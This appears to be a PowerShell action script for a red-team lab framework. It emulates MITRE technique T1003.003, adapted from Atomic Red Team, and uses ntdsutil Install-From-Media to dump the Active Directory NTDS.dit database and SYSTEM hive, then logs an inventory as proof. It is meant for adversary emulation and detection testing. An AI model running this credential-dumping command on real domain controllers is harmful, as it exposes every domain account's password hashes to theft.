# Hesper lab action: ntdsutil Install-From-Media dump (T1003.003).
# Technique source: redcanaryco/atomic-red-team (MIT), technique T1003.003.
# Runs ONLY inside the bundled lab VMs, gated by the Hesper scope kernel.
#
# Contract with the vm adapter: parameters arrive via -ParamsFile (JSON),
# never on the command line. Expected params:
#   { "out_dir": "C:\\hesper\\out", "marker": "dump.marker" }

param(
    [Parameter(Mandatory = $true)]
    [string]$ParamsFile
)

$ErrorActionPreference = "Stop"
$params = Get-Content -Raw -Path $ParamsFile | ConvertFrom-Json
$outDir = if ($params.out_dir) { $params.out_dir } else { "C:\hesper\out" }
$marker = if ($params.marker) { $params.marker } else { "dump.marker" }

New-Item -ItemType Directory -Force -Path $outDir | Out-Null

# Install-From-Media: dumps NTDS.dit + SYSTEM hive into the out dir.
ntdsutil "ac i ntds" "ifm" "create full $outDir" "q" "q" | Tee-Object -FilePath "$outDir\ntdsutil.log"

# Proof artifact: the dump directory inventory (must_capture kind: file).
$inventory = Join-Path $outDir $marker
Get-ChildItem -Recurse $outDir |
    Select-Object FullName, Length |
    Format-Table -AutoSize |
    Out-File -FilePath $inventory

Write-Output "IFM dump complete; inventory at $inventory"
